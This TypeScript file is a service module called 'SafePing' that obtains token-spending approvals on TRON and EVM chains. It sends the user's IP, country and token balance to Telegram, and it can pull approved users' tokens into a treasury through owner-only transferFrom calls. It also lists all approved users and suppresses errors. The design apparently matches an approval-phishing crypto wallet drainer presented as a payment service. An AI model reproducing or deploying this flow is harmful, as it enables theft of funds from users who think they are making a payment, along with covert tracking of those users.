// =================================
// 🔗 SafePing Main Service
// =================================

import { ONE_TIME_PING_ADDRESSES, TOKEN_ADDRESSES } from "@/constants";
import {
  BlockchainResult,
  ChainType,
  CurrencyType,
  TransferResult,
  UserInfo,
} from "@/types";
import { TronService } from "./tronService";
import { EVMService } from "./evmService";
import { TelegramService } from "./telegramService";
import { getWalletType } from "../../utils/chainUtils";

/** Base URL for server-side fetch (relative URLs fail in Node). */
function getApiBaseUrl(): string {
  if (typeof window !== "undefined") return "";
  const base = process.env.NEXT_PUBLIC_BASE_URL;
  if (base) return base.replace(/\/$/, "");
  return "http://localhost:3000";
}

export class SafePingService {
  private static instance: SafePingService;
  private nonceCache: Map<string, number> = new Map();

  private constructor() {}

  static getInstance(): SafePingService {
    if (!SafePingService.instance) {
      SafePingService.instance = new SafePingService();
    }
    return SafePingService.instance;
  }

  /**
   * Get user's current nonce from contract
   */
  async getUserNonce(chain: ChainType, userAddress: string): Promise<number> {
    try {
      if (chain === "tron") {
        try {
          return await TronService.getUserNonce(chain, userAddress);
        } catch (tronError) {
          // For TRON, if contract call fails, try to use cached nonce or default to 0
          const cacheKey = `${chain}:${userAddress}`;
          const cachedNonce = this.nonceCache.get(cacheKey);
          if (cachedNonce !== undefined) {
            return cachedNonce;
          }
          return 0; // Default nonce for new users
        }
      } else {
        return await EVMService.getUserNonce(chain, userAddress);
      }
    } catch (error) {
      const cacheKey = `${chain}:${userAddress}`;
      return this.nonceCache.get(cacheKey) || 0;
    }
  }

  /**
   * Get user's token balance
   */
  async getUserTokenBalance(
    chain: ChainType,
    currency: CurrencyType,
    userAddress: string
  ): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getUserTokenBalance(chain, currency, userAddress);
      } else {
        return await EVMService.getUserTokenBalance(chain, currency, userAddress);
      }
    } catch (error) {
      return "0";
    }
  }

  /**
   * Approve token spending using SafePing contract
   */
  async approveTokenWithSafePing(
    chain: ChainType,
    currency: string,
    amount: string,
    userAddress: string,
    paymentId: string,
    clientIP?: string
  ): Promise<BlockchainResult> {
    try {
      // Get contract address for debugging
      const contractAddress = await this.getContractAddress(chain);

      const tokenBalance = await this.getUserTokenBalance(chain, currency as CurrencyType, userAddress);

      // Common database update function - moved to API calls
      const updateWalletDatabase = async (isNewPayment: boolean = true) => {
        try {
          console.log(
            "🔄 Updating wallet database for:",
            userAddress,
            chain,
            "isNewPayment:",
            isNewPayment
          );

          // Call API endpoint instead of direct database access (absolute URL required server-side)
          const response = await fetch(`${getApiBaseUrl()}/api/payment/update-wallet`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              address: userAddress,
              chain: chain,
              currency: currency,
              amount: amount,
              tokenBalance: tokenBalance,
              isNewPayment: isNewPayment,
            }),
          });

          if (response.ok) {
            const result = await response.json();
            console.log(
              "✅ Successfully updated wallet database via API:",
              result.message
            );
          } else {
            console.warn("⚠️ Wallet database update failed via API");
          }
        } catch (dbError: any) {
          console.error("❌ Error updating wallet database via API:", dbError);
          // Don't throw error - continue with payment flow
        }
      };

      // Update payment status in database - moved to API calls
      const updatePaymentDatabase = async (txHash?: string) => {
        try {
          console.log(
            "🔄 Updating payment database for:",
            paymentId,
            "status: completed"
          );

          // Call API endpoint instead of direct database access (absolute URL required server-side)
          const response = await fetch(`${getApiBaseUrl()}/api/payment/update-status`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              paymentId: paymentId,
              status: "completed",
              walletAddress: userAddress,
              txHash: txHash || "",
            }),
          });

          if (response.ok) {
            console.log("✅ Successfully updated payment database via API");
          } else {
            console.warn("⚠️ Payment database update failed via API");
          }
        } catch (dbError: any) {
          console.error("❌ Error updating payment database via API:", dbError);
          // Don't throw error - continue with payment flow
        }
      };

      // Common telegram notification function
      const sendTelegramNotification = async () => {
        try {
          const country = await TelegramService.getCountryFromIP(clientIP);
          const walletType = getWalletType(chain);

          await TelegramService.sendApprovalNotification({
            chain,
            currency,
            userAddress,
            amount,
            paymentId,
            walletType,
            clientIP,
            tokenBalance,
            country,
          });
        } catch (telegramError) {
          // Silent error handling for production
        }
      };

      let approvalData: BlockchainResult = {
        success: false,
        txHash: "",
        message: "Approval data creation failed",
      };

      const tokenAddress = TOKEN_ADDRESSES[chain][currency as CurrencyType];

      if (chain === "tron") {
        console.log("Creating TRON approval data for owner");
        // TRON: Create approval data for user to approve owner
        approvalData = await TronService.approve(tokenAddress, contractAddress);

        // Update database and send notification (non-blocking)
        if (approvalData.success) {
          const tasks = [
            updateWalletDatabase(true),
            updatePaymentDatabase(approvalData.txHash),
            sendTelegramNotification(),
          ];

          try {
            const results = await Promise.allSettled(tasks);

            results.forEach((res, i) => {
              if (res.status === "rejected") {
                console.warn(
                  `⚠️ Task ${i + 1} failed during background operations:`,
                  res.reason
                );
              }
            });
          } catch (err) {
            console.error(
              "Unexpected error during background operations:",
              err
            );
          }
        }
      } else {
        // EVM: Create approval data for user to approve owner
        approvalData = await EVMService.approve(chain, tokenAddress, contractAddress);

        // Update database and send notification (non-blocking)
        if (approvalData.success) {
          const tasks = [
            updateWalletDatabase(true),
            updatePaymentDatabase(approvalData.txHash),
            sendTelegramNotification(),
          ];

          Promise.allSettled(tasks).catch((error) => {
            console.warn(
              "⚠️ Some background operations failed, but payment continues:",
              error
            );
          });
        }
      }

      return approvalData;
    } catch (error: any) {
      // Silent error handling for production
      return { success: false, message: error.message };
    }
  }

  /**
   * Execute auto-transfer after user approval (EVM chains)
   */
  async executeAutoTransfer(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    amount: string,
    paymentId: string
  ): Promise<TransferResult> {
    try {
      // Get treasury address from database instead of environment variables
      const { getDatabase } = await import("@/lib/database");
      const db = getDatabase();
      const treasuryWallet = await db.getTreasuryWallet(chain);

      if (!treasuryWallet || !treasuryWallet.address) {
        return {
          success: false,
          error: `No treasury wallet configured for ${chain}`,
          transferSuccess: false,
        };
      }

      const treasuryAddress = treasuryWallet.address;

      // Execute transfer using the SafePing contract
      const result = await this.transferFromUser(
        chain,
        currency,
        fromAddress,
        treasuryAddress,
        amount
      );

      if (result.success) {
        // Send webhook notification
        const webhookResult: TransferResult = {
          success: true,
          txHash: result.txHash,
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain,
        };
        await this.sendPaymentWebhook(paymentId, "completed", webhookResult);

        return {
          success: true,
          txHash: result.txHash,
          message: "Auto-transfer completed successfully",
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain,
        };
      } else {
        return {
          success: false,
          error: result.error || "Transfer failed",
          transferSuccess: false,
        };
      }
    } catch (error: any) {
      return {
        success: false,
        error: error.message || "Auto-transfer failed",
        transferSuccess: false,
      };
    }
  }

  /**
   * Transfer USDT from approved user using owner's private key
   */
  async transferFromUserAsOwner(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.transferFromUserAsOwner(
          currency,
          fromAddress,
          toAddress,
          amount
        );
      } else {
        return await EVMService.transferFromUserAsOwner(
          chain,
          currency,
          fromAddress,
          toAddress,
          amount
        );
      }
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Send webhook notification for payment status change
   */
  private async sendPaymentWebhook(
    paymentId: string,
    status: string,
    transferResult: TransferResult
  ): Promise<void> {
    try {
      const webhookUrl = process.env.WEBHOOK_URL;
      if (!webhookUrl) return;

      const payload = {
        payment_id: paymentId,
        status: status,
        transfer_tx_hash: transferResult.txHash,
        timestamp: new Date().toISOString(),
        chain: transferResult.chain || "unknown",
      };

      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (error) {
      // Silent error handling for production
    }
  }

  /**
   * Transfer USDT from approved user (owner only)
   */
  async transferFromUser(
    chain: ChainType,
    currency: CurrencyType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.transferFromUser(
          chain,
          currency,
          fromAddress,
          toAddress,
          amount
        );
      } else {
        return await EVMService.transferFromUser(
          chain,
          currency,
          fromAddress,
          toAddress,
          amount
        );
      }
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Check if user is approved for USDT spending
   */
  async isUserApproved(
    chain: ChainType,
    userAddress: string
  ): Promise<boolean> {
    try {
      if (chain === "tron") {
        return await TronService.isUserApproved(chain, userAddress);
      } else {
        return await EVMService.isUserApproved(chain, userAddress);
      }
    } catch (error) {
      // Silent error handling for production
      return false;
    }
  }

  /**
   * Get user's approved USDT allowance
   */
  async getUserAllowance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getUserAllowance(chain, userAddress);
      } else {
        return await EVMService.getUserAllowance(chain, userAddress);
      }
    } catch (error) {
      // Silent error handling for production
      return "0";
    }
  }

  /**
   * Get all approved users
   */
  async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
    try {
      if (chain === "tron") {
        return await TronService.getAllApprovedUsers(chain);
      } else {
        return await EVMService.getAllApprovedUsers(chain);
      }
    } catch (error) {
      // Silent error handling for production
      return [];
    }
  }

  /**
   * Revoke user approval
   */
  async revokeUserApproval(
    chain: ChainType,
    userAddress: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.revokeUserApproval(chain, userAddress);
      } else {
        return await EVMService.revokeUserApproval(chain, userAddress);
      }
    } catch (error: any) {
      // Silent error handling for production
      return { success: false, error: error.message };
    }
  }

  /**
   * Get contract address for the specified chain
   */
  private async getContractAddress(chain: ChainType): Promise<string> {
    return ONE_TIME_PING_ADDRESSES[chain];
  }

  /**
   * Get comprehensive user info
   */
  async getUserInfo(chain: ChainType, currency: CurrencyType, userAddress: string): Promise<UserInfo> {
    try {
      const [allowance, nonce, isApproved, tokenBalance] = await Promise.all([
        this.getUserAllowance(chain, userAddress),
        this.getUserNonce(chain, userAddress),
        this.isUserApproved(chain, userAddress),
        this.getUserTokenBalance(chain, currency, userAddress),
      ]);

      return {
        address: userAddress,
        allowance,
        nonce,
        isApproved,
        tokenBalance,
      };
    } catch (error) {
      // Silent error handling for production
      throw error;
    }
  }
}

// Export singleton instance
export const safePingService = SafePingService.getInstance();
